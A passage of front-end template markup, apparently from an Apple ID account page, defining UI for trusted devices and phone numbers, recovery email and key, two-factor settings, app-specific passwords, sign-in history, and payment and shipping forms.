                    <h2 class="wrap-popover-title">
                        Password
                    </h2>
                </div>
                <div class="pop-content popover-content popover-body">
                    <div class="flow-changePassword">
                        <div class="changepass-container">
                            {{^if showPasswordAccountSignoutInfo}}
                            <changepasswordflow account="{account}" config="{config}" flow="{flow}" error="{error}" success="{success}"></changepasswordflow>
                            {{else}}
                            <changepasswordsignoutinfo></changepasswordsignoutinfo>
                            {{/if}}
                        </div>
                    </div>
                </div>
            </div>
        {{/flow}}
    </div>
</div>

</script>
<script type="text/stache" id="jstache_1366915291">


<h3 class="section-subtitle"> TRUSTED PHONE NUMBERS </h3>
{{#account.security.phoneNumbers.length}}
{{#each account.security.phoneNumbers}}
    <div class="detail trusted-phone">
        <span class="force-ltr">
            {{fullNumberWithCountryPrefix}}
        </span>
        {{#unless vetted}}
        <deletetrusted phoneidentity="{id}" account="{account}" config="{config}" device-list="{account.security.phoneNumbers}" device-index="{{%index}}"></deletetrusted>
        <verifyphone account="{account}" config="{config}" trusted-phone="{.}" livestatus="{{liveStatus}}" type="{{type}}" device-list="{account.security.phoneNumbers}" device-index="{{%index}}"></verifyphone>
        {{else}}
            {{#isOnlyVetted this account.security.phoneNumbers}}
                 
            {{else}}
                <deletetrusted phoneidentity="{id}" account="{account}" config="{config}" device-list="{account.security.phoneNumbers}" device-index="{{%index}}"></deletetrusted>
            {{/if}}
        {{/unless}}
    </div>
{{/each}}
{{/account.security.phoneNumbers.length}}
<div class="pop-wrapper detail">
    <button class="btn btn-link add-trusted">
        Add a Trusted Phone Number...
    </button>
    {{#flow}}
        <div class="popover pop-flow pop-trustedPhone" role="group" tabindex="-1" style="display: none;">
            <div id="arrow" class="pop-arrow arrow"></div>
            <div class="mobile-only section-title">
                <h2 class="wrap-popover-title">
                    {{#is step "1"}}
                        Phone Number
                    {{/is}}
                    {{#is step "2"}}
                        Verify Phone
                    {{/is}}
                </h2>
            </div>
            <div class="pop-content popover-content">
                <trustedphoneflow account="{account}" config="{config}" flow="{flow}" device-list="{account.security.phoneNumbers}" step="{step}"></trustedphoneflow>
            </div>
        </div>
    {{/flow}}
</div>

</script>
<script type="text/stache" id="jstache_819195973">


<!-- Trusted Phone Numbers -->
<h3 class="section-subtitle">TRUSTED PHONE NUMBERS</h3>
{{#account.security.devices.length}}
    {{#filter account.security.devices filters.allPhoneNumbersFilter}}
        {{#each .}}
                <div class="detail trusted-device {{type}} clearfix">
                <namedevice name="{{name}}" type-name="{{typeName}}" status="{{liveStatus}}" type="{{type}}"></namedevice>
                {{#unless vetted}}
                    <deletedevice phoneidentity="{id}" account="{account}" config="{config}" type="{{type}}" device-list="{account.security.devices}"></deletedevice>
                    <verifydevice account="{account}" config="{config}" trusted-phone="{.}" verifynumber="{{rawNumber}}" livestatus="{{liveStatus}}" type="{{type}}" vetted="{vetted}" device-list="{account.security.devices}" device-index="{{%index}}"></verifydevice>
                {{else}}
                    {{#isOnlyVetted this account.security.devices}}
                         
                    {{else}}
                        <deletedevice phoneidentity="{id}" account="{account}" config="{config}" type="{{type}}" device-list="{account.security.devices}"></deletedevice>
                    {{/is}}
                {{/unless}}
                </div>
        {{/each}}
    {{/filterEach}}
{{/account.security.devices.length}}
<!-- end Trusted Phone Numbers -->
<div class="pop-wrapper detail">
    <button class="btn btn-link add-device" aria-haspopup="true">Add another phone number</button>
    {{#flow}}
        <div class="popover pop-flow pop-trustedPhone" role="group" tabindex="-1" style="display: none;">
            <div id="arrow" class="pop-arrow arrow"></div>
            <div class="mobile-only section-title">
                <h2 class="wrap-popover-title">
                  {{#is step "1"}}
                      Phone Number
                  {{/is}}
                  {{#is step "2"}}
                      Verify Phone
                  {{/is}}
                </h2>
             </div>
            <div class="pop-content popover-content">
                <trustedphoneflow account="{account}" config="{config}" flow="{flow}" device-list="{account.security.devices}" step="{step}"></trustedphoneflow>
            </div>
        </div>
    {{/flow}}
</div>



</script>
<script type="text/stache" id="jstache_1885969886">


<!-- Trusted Devices -->
<div class="trusted-devices-section">
    <h3 class="section-subtitle">TRUSTED DEVICES</h3>
    {{#if displayEmptyDevices}}
    No Devices Available
    {{else}}
        {{#filter account.security.devices filters.allDevicesFilter}}
                {{#if vettedDevices.length}}
                    {{#each vettedDevices}}
                        <div class="detail trusted-device {{type}} clearfix device-container">
                            <div>
                                <!--<namedevice class="device-item" name="{{name}}" type-name="{{typeName}}" status="{{liveStatus}}" type="{{type}}"></namedevice>-->
                                <span class="{{styleClass}} device-name force-ltr">
                                    <string-ellipsis content-value="{name}" show-length="15">{{ name }}</string-ellipsis>
                                </span> 
                                {{#modelName}}<small class="device-class-name">({{modelName}})</small>{{/modelName}}
                                {{#isDeviceOffline}} <small class="device-status">(Offline)</small>{{/isDeviceOffline}}
                                <deletedevice class="device-delete" phoneidentity="{id}" account="{account}" config="{config}" type="{{type}}" device-list="{account.security.devices}" device-index="{{%index}}"></deletedevice>
                            </div>
                        </div>
                    {{/each}}
                {{/if}}
        <!-- Verify trusted device popover -->
            {{#if onlineUnvetted.length}}
            <div class="pop-wrapper detail">
                <button class="btn btn-link verify-device" aria-haspopup="true">
                    {{#if vettedDevices.length}}
                        {{#is onlineUnvetted.length 1}}
                            Verify 1 More Device...
                        {{else}}
                            Verify {{onlineUnvetted.length}} More Devices...
                        {{/is}}
                    {{else}}
                        {{#is onlineUnvetted.length 1}}
                            Verify 1 Device
                        {{else}}
                            Verify {{onlineUnvetted.length}} Devices...
                        {{/is}}
                    {{/if}}
                </button>
                <!-- Add trusted phone number -->
                {{#flow}}
                    <div class="popover pop-flow pop-verify-devices" role="group" tabindex="-1" style="display: none;">
                        <div id="arrow" class="pop-arrow arrow"></div>
                        <div class="popover-title">
                          {{#is step "1"}}
                            Verify Device
                          {{/is}}
                          {{#is step "2"}}
                            Verify Device
                          {{/is}}
                          </div>
                        <div class="pop-content popover-content">
                            <verify-device-flow account="{account}" config="{config}" flow="{flow}" device-list="{account.security.devices}" step="{step}"></verify-device-flow>
                        </div>
                    </div>
                {{/flow}}
                <!-- end Add trusted phone number -->
            </div>
            {{/if}}
        <!-- end Verify trusted device popover -->
        {{/filter}}
    {{/if}}
    <!-- end Trusted Devices -->
</div>

</script>
<script type="text/stache" id="jstache_365122453">


<h3 class="section-subtitle">
    {{#is account.type "hsa2"}}
        NOTIFICATION EMAIL
    {{/if}}
    {{#is account.type "hsa1"}}
        NOTIFICATION EMAIL
    {{/if}}
    {{#is account.type "sa"}}
        RESCUE EMAIL
    {{/if}}
</h3>
<div class="recovery-email">
    {{#if account.security.rescueEmail}}
        <dl class="dl inline-dl account-detail detail recovery-wrapper clearfix">
            <dt class="dt info-dt">
                <string-ellipsis content-value="{account.security.rescueEmail}">{{ account.security.rescueEmail }}</string-ellipsis>
            </dt>
            {{^if account.person.isUnderAge}}
                <dd class="dd action-dd">
                     {{#if success}}
                        <i class="icon icon_green_check icon_check recovery-email-updated"></i>
                        <span class="sr-only">Success</span>
                     {{/if}}
                    {{#if account.security.isRescueEmailVerified}}
                        <deleterecovery account="{account}" config="{config}" {success}="success"></deleterecovery>
                    {{else}}
                        <deleterecovery account="{account}" config="{config}" {success}="success"></deleterecovery>
                        <verifyrecovery account="{account}" config="{config}" {success}="success"></verifyrecovery>
                    {{/if}}
                </dd>
            {{/if}}
        </dl>
    {{/if}}
    <div class="pop-wrapper detail">
        <button class="btn btn-link add-recovery">
            {{#if account.security.rescueEmail}}
                Edit Email Address...
            {{else}}
                Add an Email Address...
            {{/if}}
        </button>
        {{#flow}}
            <div class="popover pop-flow pop-email pop-recoveryEmail" role="group" tabindex="-1" style="display: none;">
                <div class="pop-arrow arrow"></div>
                <div class="mobile-only section-title">
                    <h2 class="wrap-popover-title">
                        Email
                    </h2>
                </div>
                <div class="pop-content popover-content">
                    <changerecoveryflow account="{account}" config="{config}" flow="{flow}" {(success)}="success" step="{step}"></changerecoveryflow>
                </div>
            </div>
        {{/flow}}
    </div>
</div>



</script>
<script type="text/stache" id="jstache_1272599203">


<section>
    <header>
        <h3 class="section-subtitle no-outline" tabindex="-1">
            RESCUE EMAIL
        </h3>
    </header>
    <div class="detail rescue-email">
        {{#if account.security.rescueEmail}}
            <div class="pin-tip-wrapper recovery-email clearfix">
                <string-ellipsis content-value="{account.security.rescueEmail}">{{ account.security.rescueEmail }}</string-ellipsis>
            </div>
            {{#if success}}
                <i class="icon icon_green_check icon_check rescue-email-updated"></i>
                <span class="sr-only">Success</span>
            {{/if}}
            {{^if account.security.isRescueEmailVerified}}
                <div class="verify-rescue-wrapper">
                    <verify-rescue-email account="{account}" config="{config}"></verify-rescue-email>
                </div>
            {{/if}}
        {{else}}
        <div class="pop-wrapper detail">
            <button class="btn btn-link add-rescue-email" aria-describedby="addRescueEmailViewPopover">Add a Rescue Email...</button>
            {{#if showAddRescueEmailPopover}}
            <div id="addRescueEmailViewPopover" class="popover pop-flow pop-email pop-addRescueEmailView" role="group" tabindex="0" aria-labelledby="addRecoveryEmailTitle" style="display: none;">
                <div class="pop-arrow arrow"></div>
                <div class="mobile-only section-title">
                    <h2 class="wrap-popover-title">
                        Email
                    </h2>
                </div>
                <div class="pop-content popover-content">
                    <changerecoveryflow {(account)}="account"
                                        {config}="config"
                                        title-text='A verified rescue email will allow you to reset your password and security questions if you ever forget them.'
                                        {(flow)}="showAddRescueEmailPopover"
                                        {(success)}="success"></changerecoveryflow>
                </div>
            </div>
            {{/if}}
        </div>
        {{/if}}
    </div>
</section>

</script>
<script type="text/stache" id="jstache_1913731711">


<h3 class="section-subtitle" id="securityQuestionLabel">SECURITY QUESTIONS</h3>
<div class="detail">
    <div class="pop-wrapper">
        <button class="btn btn-link change-questions">Change Questions...</button>
        {{#showSuccess}}<i class="icon icon_green_check icon_check questions-updated"></i>{{/if}}
        {{#flow}}
            <div class="popover pop-flow pop-questions" role="group" tabindex="0" aria-labelledby="securityQuestionLabel" aria-describedby="securityQuestionDescription" style="display: none;">
                <div class="pop-arrow arrow"></div>
                <div class="mobile-only section-title">
                    <h2 class="wrap-popover-title">
                        Questions
                    </h2>
                </div>
                <div class="pop-content popover-content popover-body">
                    <changequestionsflow account="{account}" config="{config}" flow="{flow}" success="{success}"></changequestionsflow>
                </div>
            </div>
        {{/flow}}
    </div>
</div>

</script>
<script type="text/stache" id="jstache_1612373957">


<h3 class="section-subtitle">RECOVERY KEY</h3>
<p class="obfuscated-rk-key">RK-</p>
<div class="pop-wrapper detail">
    <button class="btn btn-link change-rk">Create New Key...</button>
    <idms-popover-modal  float-mode="bottom" mode="{modalMode}" max-width="380" type="action" anchor-element=".change-rk" {(show)}="showChangeRk">
        <div class="popover-body idms-popover-modal-content">
            <div class="row">
                <div class="col-sm-12">
                    <div class="mobile-only">
                    {{^is modalMode 'mobile-full-page'}}
                        <h4 class="idms-popover-modal-title">Create New Recovery Key?</h4>
                    {{/if}}
                    </div>
                    <div class="details idms-popover-modal-body">
                        <changerecoverykeyflow account="{account}" config="{config}" success="{success}" {(modal-mode)}="modalMode" {(show-change-rk}="showChangeRk" {(show-tool-bar)}="showToolBar" ></changerecoverykeyflow>
                    </div>
                </div>
            </div>
        </div>
    </idms-popover-modal>
</div>

</script>
<script type="text/stache" id="jstache_623346877">


<h3 class="section-subtitle" id="twoStepLabel">TWO-STEP VERIFICATION</h3>
<div class="detail" role="group" aria-describedby="twoStepLabel">
    {{#account.security.embargoInfo}}
        <div class="embargo-info no-outline" id="twoStepEnrollDescription" tabindex="-1">Come back after {{account.security.embargoInfo.embargoEndTime}} on {{account.security.embargoInfo.embargoEndDate}} to set up <span class="nowrap">two-step verification.</span></div>
        <a href="https://support.apple.com/HT204152" target="_blank">More information.</a>
    {{else}}
        <div class="body-text no-outline" id="twoStepEnrollDescription" tabindex="-1">Add an extra layer of security to your account.</div>
        <div class="pop-wrapper modal-wrapper">
            <button class="btn btn-link two-step-enroll">Get Started...</button>
            {{#notice}}
                <div class="popover pop-flow pop-unenroll" role="tooltip" style="display: none;">
                    <div id="arrow" class="pop-arrow arrow"></div>
                    <div class="flow-content">

                        <div>Two-step verification has been turned off.</div>
                    </div>
                </div>
            {{/notice}}
        </div>
    {{/if}}
</div>

</script>
<script type="text/stache" id="jstache_140496437">


{{#is account.type "hsa1"}}
    <div class="row">
        <div class="col-sm-5">
            <h3 class="section-subtitle" id="secureSignIn">
                TWO-STEP VERIFICATION
            </h3>
            <div class="detail" aria-labelledby="twoStepUnenrollLabel" aria-describedby="twoStepUnenrollDescription">
                On
            </div>
        </div>
        <div class="col-sm-5">
            <div class="description" id="twoStepUnenrollDescription">
                Your Apple ID is protected with two-step verification. <a href="https://support.apple.com/HT204152" target="_blank" class="nowrap">Learn more.</a>
                <div class="pop-wrapper detail">
                    <button class="btn btn-link unenroll">
                        Turn Off Two-Step Verification
                    </button>
                    {{#flow}}
                        <div class="popover pop-flow pop-unenroll" role="group" tabindex="-1" style="display: none;">
                            <div class="pop-arrow arrow"></div>
                            <div class="mobile-only section-title">
                                <h2 class="wrap-popover-title">
                                    Security
                                </h2>
                            </div>
                            <div class="pop-content popover-content">
                                <twostepunenrollflow editable-birthday="{editableBirthday}" account="{account}" config="{config}" flow="{flow}" add-trusted="{addTrusted}" birthday="{account.security.birthday}" rescue-email="{account.security.rescueEmail}" unenrolled="{confirmUnenroll}" {(un-enrolled-attributes)}="unEnrolledAttributes"></twostepunenrollflow>
                            </div>
                        </div>
                    {{/flow}}
                </div>
            </div>
        </div>
    </div>
{{/if}}
{{#is account.type "hsa2"}}
    <div class="row">
        <div class="col-sm-5">
            <h3 class="section-subtitle">
                TWO-FACTOR AUTHENTICATION
            </h3>
            <div class="details">On</div>
        </div>
        <div class="col-sm-5">
            <div class="description">
                {{#is account.type "hsa1"}}
                    Your password and a verification code will be required when your Apple ID is used to sign in on a new device or browser. <a href="https://support.apple.com/HT204152" target="_blank" class="nowrap">Learn more.</a>
                {{/if}}
                {{#is account.type "hsa2"}}
                    Your password and a verification code will be required when your Apple ID is used to sign in on a new device or browser. <a href="https://support.apple.com/kb/HT204915" target="_blank" class="nowrap">Learn more.</a>
                {{/if}}
                {{#if allowOptOut}}
                <div class="pop-wrapper detail">
                    <button class="btn btn-link unenroll">
                        Turn Off Two-Factor Authentication
                    </button>
                    {{#flow}}
                        <div class="popover pop-flow pop-unenroll" role="tooltip" style="display: none;">
                            <div class="pop-arrow arrow"></div>
                            <div class="mobile-only section-title">
                                <h2 class="wrap-popover-title">
                                    Security
                                </h2>
                            </div>
                            <div class="pop-content popover-content">
                                <twostepunenrollflow editable-birthday="{editableBirthday}" account="{account}" config="{config}" flow="{flow}" add-trusted="{addTrusted}" unenrolled="{confirmUnenroll}" {(un-enrolled-attributes)}="unEnrolledAttributes"></twostepunenrollflow>
                            </div>
                        </div>
                    {{/flow}}
                </div>
                {{/if}}
            </div>
        </div>
    </div>
{{/if}}

</script>
<script type="text/stache" id="jstache_1080266047">


<div class="unenroll-confirm-modal modal confirm-flow-dialog default-dialog fade" id="confirmUnenrollModal" data-backdrop="static">
    <div class="modal-dialog">
        <div class="modal-content" role="dialog" aria-labelledby="confirmUnenrollModalTitle" tabindex="-1">
            <div class="modal-body">
                <div class="modal-header">
                    <h4 class="modal-title" id="confirmUnenrollModalTitle">
                        {{#is account.type "hsa2"}}
                            Two-factor authentication has been turned off.
                        {{/if}}
                        {{#is account.type "hsa1"}}
                            Two-step verification has been turned off.
                        {{/if}}
                    </h4>
                </div>
                <div class="modal-body-content body-text">
                    Your account is now protected with your password and security questions.
                </div>
            </div>
            <div class="modal-footer clearfix">
                <div class="btn-group flow-controls pull-right">
                    <button type="button" class="btn btn-link last done-unenroll" data-dismiss="modal">OK</button>
                </div>
            </div>
        </div>
    </div>
</div>
</script>
<script type="text/stache" id="jstache_1822057793">


<h3 class="section-subtitle" id="appSpecificLabel">APP-SPECIFIC PASSWORDS</h3>
<div class="pop-wrapper detail upgrade-now" aria-labelledby="appSpecificLabel" aria-describedby="appSpecificDescription">
    <button class="btn btn-link btn-appPassword">Generate Password...</button>
    {{#flow}}
        <div class="popover pop-flow pop-appPassword" role="group" tabindex="-1" style="display: none;">
            <div class="pop-arrow arrow"></div>
            <div class="mobile-only section-title">
                <h2 class="wrap-popover-title">
                    Password
                </h2>
            </div>
            <div class="pop-content popover-content">
                <apppasswordflow account="{account}" flow="{flow}"{{#action}} action="{action}" password-label="iMessage and FaceTime"{{/if}}></apppasswordflow>
            </div>
        </div>
    {{/flow}}
</div>



</script>
<script type="text/stache" id="jstache_475572078">


<div class="pop-wrapper">
    <button id="viewAppPasswordHistory" class="btn btn-link btn-appPasswordHistory">
        View History
    </button>
    <idms-popover-modal class="app-pass-history-flow" float-mode="bottom" mode="mobile-full-page" max-width="600" type="action" anchor-element=".btn-appPasswordHistory" {(show)}="showAppPassHistory" role="group" tabindex="-1">
        <div class="pop-scrollflow">
           <div class="details idms-popover-modal-body">
               <apppasswordhistoryflow flow="{flow}" account="{account}" config="{config}" {(show-app-pass-history)}="showAppPassHistory" app-passwords-revoked="{appPasswordsRevoked}"></apppasswordhistoryflow>
           </div>
        </div>
    </idms-popover-modal>
</div>

</script>
<script type="text/stache" id="jstache_1882675722">


<div class="col-sm-3 device-details {{#flow}}device-hidden{{/flow}}">
    <div class="device-image-wrapper">
        <img src="{{deviceImageSrc}}" class="device-image" />
    </div>
    <div class="device-row-wrapper">
        <div class="detail not-mobile">
            <div class="pop-wrapper">
                <button class="btn btn-link name device-info device-info-not-mobile {{anchorElement}}" data-deviceid="{{id}}">{{name}}</button>
            </div>
        </div>
        <div class="detail mobile-only">
                    <div class="pop-wrapper {{#is modal true}}pop-stack{{else}}pop-inline{{/is}}">
                        <button class="btn btn-link name device-info device-info-mobile-btn" data-deviceid="{{id}}">{{name}}</button>
                        {{#flow}}
                        <div class="popover pop-flow full-details" role="group" tabindex="0" style="display: none;">
                            <div class="pop-arrow arrow"></div>
                            <div class="mobile-only section-title device-details-title">
                                <h2 class="wrap-popover-title">
                                    Details
                                </h2>
                            </div>
                            <div class="pop-content popover-content deviceDetails">
                                <info deviceinfo="{device}" devices="{devices}" dialog="{dialog}" account="{account}" flow="{flow}"></info>
                            </div>
                        </div>
                        {{/flow}}
                    </div>
        </div>
        <div class="device-capabilities">
            <div class="device-type">{{modelName}}</div>
            {{#if device.applePayCards.length}}
                <div class="applePay"></div>
            {{/if}}
        </div>
    </div>
    <idms-popover float-mode="bottom" max-width="350" type="action" anchor-element=".{{anchorElement}}" {(show)}="showDeviceInfo" role="group" tabindex="-1">
    <div class="details idms-popover-modal-body device-details-popover">
      <info deviceinfo="{device}" devices="{devices}" dialog="{dialog}" account="{account}" flow="{flow}"></info>
    </div>
    </idms-popover-modal>
</div>

</script>
<script type="text/stache" id="jstache_1509287987">


<div class="modal fade in view-history-modal" id="view-history-modal" role="dialog" aria-labelledby="view-history-title" aria-hidden="true">
  <div class="modal-dialog">
    <div class="modal-content">
      <div class="modal-header">
        <div class="view-history">
        </div>
        <h3 class="modal-title show-view-title">Sign In History </h3>
      </div>
      <div class="modal-body">
        <div class="history-content">
          <p class="data">Today at 10:00 p.m.
            <button class="btn btn-link showdetails"  data-toggle="collapse"  data-target="#collaspe-history-info">
              {{#showdetails}}Show{{/showdetails}}{{^showdetails}}Hide{{/showdetails}} details
            </button>
            <div class="collapse" id="collaspe-history-info">
              <div class="historyExpanded">
                <span class="historyExpandedInfo"> IP Address: </span>
                <span class="historyExpandedInfo"> Signed in as: </span>
                <span class="historyExpandedInfo"> Signed in on: </span>
              </div>
            </div>
          </p>
          <p class="data">xxxxxxxxxxx. </p>
          <p class="data">xxxxxxxxxxx. </p>
          <p class="data">xxxxxxxxxxx. </p>
          <p class="data">xxxxxxxxxxx. </p>
          <p class="data">xxxxxxxxxxx. </p>
        </div>
      </div>
      <div class="history-message">
        <span>
          If you recently did not sign in with your Apple ID and believe someone may have accessed your account, <button class="btn btn-link history-link">change your password</button>
        </span>
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-link done" data-dismiss="modal">Done</button>
      </div>
    </div>
  </div>
</div>
</script>
<script type="text/stache" id="jstache_689097337">


<div class="flow-subsection">
    <div class="detail">
        
        <img src="https://appleid.cdn-apple.com/static/bin/cb2442680439/dist/assets/images/alert_icon.png" alt="Alert icon" class="expired-cc" />
        {{errorMessage}}
    </div>
</div>
</script>
<script type="text/stache" id="jstache_1369946985">


<div class="modal fade flow-dialog default-dialog" id="iTunesErrorModal" role="dialog" aria-labelledby="" tabindex="0" data-backdrop="static">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-body">
                <div class="row">
                    <div class="col-sm-2 not-mobile">
                        <img src="https://appleid.cdn-apple.com/static/bin/cb2442680439/dist/assets/images/alert_icon.png" alt="Alert icon" width="60" class="alert-icon" />
                    </div>
                    <div class="col-sm-10 exclude-padding modal-wrapper">
                        <div class="modal-header content">
                            <h4 class="modal-title" id="iTunesErrorModal">Update your payment information</h4>
                        </div>
                        <div class="modal-body-content">
                            <p class="body-text">Enter a valid payment method for the country you've selected.</p>
                        </div>
                    </div>
                </div>
            </div>
            <div class="modal-footer clearfix">
                <div class="btn-group flow-controls pull-right">
                    <button type="button" class="btn btn-link last ok" data-dismiss="modal">OK</button>
                </div>
            </div>
        </div>
    </div>
</div>

</script>
<script type="text/stache" id="jstache_595416699">


<div class="modal fade flow-dialog default-dialog payment-load-error-dialog" id="paymentErrorModal" data-backdrop="static">
    <div class="modal-dialog">
        <div class="modal-content" role="dialog" aria-labelledby="paymentErrorModalTitle" tabindex="-1">
            <div class="modal-body payment-error-body">
                <div class="row">
                    <div class="col-sm-2 not-mobile">
                        <img src="https://appleid.cdn-apple.com/static/bin/cb2442680439/dist/assets/images/alert_icon.png" alt="Alert icon" width="60" class="alert-icon" />
                    </div>
                    <div class="col-sm-10 exclude-padding modal-wrapper">
                        <div class="modal-header content">
                            <h4 class="modal-title" id="paymentErrorModalTitle">{{paymentErrorTitle}}</h4>
                        </div>
                        <div class="modal-body-content">
                            <p class="body-text">{{paymentErrorMessage}} </p>
                            <p class="body-text content"></p>
                        </div>
                    </div>
                </div>
            </div>
            <div class="modal-footer clearfix">
                <div class="btn-group flow-controls pull-right">
                    <button type="button" class="btn btn-link last" data-dismiss="modal">OK</button>
                </div>
            </div>
        </div>
    </div>
</div>
</script>
<script type="text/stache" id="jstache_988688183">


<div class="modal flow-dialog default-dialog verify-payment-card-modal" id="verifyPaymentCardModal" data-backdrop="static" data-keyboard="false">
    <div class="modal-dialog">
        <div class="modal-content" role="dialog" aria-labelledby="verifyPaymentCardLabel" tabindex="-1">
            <div class="modal-header">
                <h4 class="modal-title">Verify your identity to add this card.</h4>
            </div>
            <div class="modal-body">
                <div class="intro">
                    A verification code has been sent to <b>{{creditCard.phoneNumber.fullNumberWithCountryPrefix}}</b>. Enter the code here.
                </div>
                <div class="action-wrapper">
                    <div class="pop-wrapper field-pop-wrapper verify-set clearfix">
                        <div class="code-wrapper clearfix">
                            <basic-input errors="{errors}" value="{transaction.smsCode}" placeholder="verification code" validate-on-blur="false"></basic>
                        </div>
                        {{#if showErrorPopover}}
                            {{#if errors.main.message}}
                                <div class="errorPop-body popover" role="tooltip" style="">
                                    <div id="arrow" class="errorPop-arrow arrow"></div>
                                    <div class="errorPop-content popover-content">
                                        {{errors.main.message}}
                                    </div>
                                </div>
                            {{/if}}
                        {{/if}}
                    </div>
                </div>
            </div>
            <div class="pull-left">
                <button class="btn btn-link resend" {{#if isSendingNewCode}} disabled {{/if}}>
                    {{^if isSendingNewCode}}
                        <i class="icon icon_reload"></i> Send a new code
                    {{else}}
                        <loading loading="{isSendingNewCode}"></loading>Sending Code
                    {{/if}}
                </button>
            </div>

            <div class="modal-footer clearfix mobile-verify-payment-footer">
                <div class="btn-group flow-controls pull-right {{#if isVerifyingCode}} loading {{/if}}">
                    <loading loading="{isVerifyingCode}"></loading>
                    <button type="button" role="button" class="btn btn-link first cancel" data-dismiss="modal">Cancel</button>
                    <button type="button" role="button" class="btn btn-link last verify-code" {{^if transaction.smsCode}}disabled{{/if}}>Verify</button>
                </div>
            </div>
        </div>
    </div>
</div>

</script>
<script type="text/stache" id="jstache_133928773">


<div class="modal flow-dialog default-dialog verify-alipay-modal" id="verifyAlipayModal" data-backdrop="static" data-keyboard="false">
    <div class="modal-dialog">
        <div class="modal-content" role="dialog" aria-labelledby="verifyAlipayLabel" tabindex="-1">
            <div class="modal-header">
                <h4 class="modal-title">Verify your identity to add Alipay as a payment method.</h4>
            </div>
            <div class="modal-body">
                <div class="intro">
                    A verification code has been sent to <b>{{alipay.obfuscatedPhoneNumber}}</b>. Enter the code here.
                </div>
                    <div class="verify-set clearfix">
                        <div class="code-wrapper clearfix">
                            <basic-input {(errors)}="errors"
                                         {(value)}="transaction.smsCode"
                                         use-popover="true"
                                         is-required="true"
                                         placeholder="verification code"
                                         validate-on-blur="false" ></basic>
                        </div>
                    </div>
                    <div class="edit-description">
                        By clicking Verify, you accept the <a href="{{userAgreement}}" target="_blank" title="Alipay User Agreement">Alipay User Agreement</a>. After completing the verification, funds will be deducted from your Alipay account when you make purchases using your Apple ID. You will not be asked for your password.
                    </div>
            </div>
            <div class="pull-left">
                <button class="btn btn-link resend" {{#if isSendingNewCode}} disabled {{/if}}>
                {{^if isSendingNewCode}}
                <i class="icon icon_reload"></i> Send a new code
                {{else}}
                <loading loading="{isSendingNewCode}"></loading>Sending Code
                {{/if}}
                </button>
            </div>

            <div class="modal-footer clearfix mobile-verify-payment-footer">
                <div class="btn-group flow-controls pull-right {{#if isVerifyingCode}} loading {{/if}}">
                    <loading loading="{isVerifyingCode}"></loading>
                    <button type="button" role="button" class="btn btn-link first cancel" data-dismiss="modal">Cancel</button>
                    <button type="button" role="button" class="btn btn-link last verify-code" {{^if transaction.smsCode}}disabled{{/if}}>Verify</button>
                </div>
            </div>
        </div>
    </div>
</div>

</script>
<script type="text/stache" id="jstache_364888947">


<section>
        <h3 class="section-subtitle">SHIPPING ADDRESS</h3>
        <div class="pop-wrapper field-pop-wrapper">
            <div class="form-group ">
                <basic-input classes="content-input {{#if errors.firstName.hasErrors}}error{{/if}} shipping-address-firstName"
                             sr-label-text='First Name'
                             placeholder='first name'
                             is-required='true'
                             {^@validate}="saValidators.firstName"
                             validate-on-blur='false'
                             error-strings.empty='Enter a first name.'
                             use-popover="true"
                             {(errors)}='errors.firstName'
                             {(value)}="recipient.firstName"></basic-input>
            </div>
        </div>

        <div class="pop-wrapper field-pop-wrapper">
            <div class="form-group ">
                <basic-input classes="content-input {{#if errors.lastName.hasErrors}}error{{/if}} shipping-address-lastName"
                             sr-label-text='Last Name'
                             placeholder='last name'
                             is-required='true'
                             {^@validate}="saValidators.lastName"
                             validate-on-blur='false'
                             use-popover="true"
                             error-strings.empty='Enter a last name.'
                             {(errors)}='errors.lastName'
                             {(value)}="recipient.lastName"></basic-input>
            </div>
        </div>

        <div class="pop-wrapper field-pop-wrapper">
            <div class="form-group ">
                <basic-input classes="content-input {{#if errors.company.hasErrors}}error{{/if}} shipping-address-company"
                             sr-label-text='Company (optional)'
                             placeholder='company (optional)'
                             is-required="false"
                             validate-on-blur='false'
                             {(errors)}='errors.company'
                             use-popover="true"
                             {(value)}="recipient.company"></basic-input>
            </div>
        </div>

        <idms-address {^is-address-dirty}="isAddressDirty"
                      {^address}="newAddress"
                      {^@validate-address}="validateAddress"
                      {^address-features}="newAddressFeatures"
                      {country-options}="countryOptions"
                      {initial-address}="shippingAddress"
                      {localized-strings}="localizedStrings"
                      {initial-address-features}="addressFeatures"
                      {needs-address-features}="needsAddressFeatures"
                      {default-country-code}="defaultCountryCode"
                      reset-on-country-change="true"
                      {validators}="saValidators"
                      {(errors)}="errors">
        </idms-address>
    </div>
</section>

</script>
<script type="text/stache" id="jstache_852134819">


{{#if showPaymentMethodOptions}}
<div class="form-group">
    <div class="select-wrapper clearfix">
        <basic-input classes="content-input form-control {{#if paymentMethodOptionErrors.hasErrors}}has-errors{{/if}}"
            sr-label-text='Select payment method'
            placeholder='Select Payment Method'
            {(value)}="paymentMethodOption"
            {options}="parsedPaymentMethodOptions"
            {^@validate}="validators.paymentMethodOptions"
            validate-on-blur='false'
            is-required="true"
            {use-popover}="usePopover"
            error-strings.empty='Select a valid payment method.'
            {(errors)}="paymentMethodOptionErrors"></basic-input>
    </div>
</div>
{{/if}}

{{#is paymentMethodOption 'card'}}
<credit-card-number {(number)}="paymentMethod.number"
    {(type)}="paymentMethod.type"
    {^@validate}="validators.creditCardNumber"
    {use-popover}="usePopover"
    {(errors)}="errors.paymentMethod.number">
</credit-card-number>

{{#if needsDateAndCode}}
<div class="row mobile-narrow two-columns">
    <div class="col-sm-6 col">
        <expiration-date {(expiration-month-year)}="paymentMethod.expirationMonthYear"
            {^@validate}="validators.expirationMonthYear"
            {date-format}="expirationDateFormat"
            {use-popover}="usePopover"
            {(errors)}="errors.paymentMethod.expirationMonthYear">
        </expiration-date>
    </div>

    <div class="col-sm-6 col">
        <cvv-number {(cvv)}="paymentMethod.cvv"
            {^@validate}="validators.cvv"
            {use-popover}="usePopover"
            {(errors)}="errors.paymentMethod.cvv">
        </cvv-number>
    </div>
</div>
{{/if}}
{{/is}} 

{{#is paymentMethodOption 'alipay'}}
    <h3 class="section-subtitle">ALIPAY ID</h3>
    <alipay-edit {(phone-number)}="phoneNumber"
        {(payment-method)}="paymentMethod"
        {use-popover}="usePopover"
        {^validators}="alipayValidators"
        {sms-supported-countries}="smsSupportedCountries"
        {(errors)}="errors"></alipay-edit>
{{/is}}

<a name="billing-address"></a>
<div class="billing-address">
    <billing-address {address-features}="paymentAddressFeatures"
        {page-features}="pageFeatures"
        {supported-countries}="supportedCountries"
        {default-country-code}="defaultCountryCode"
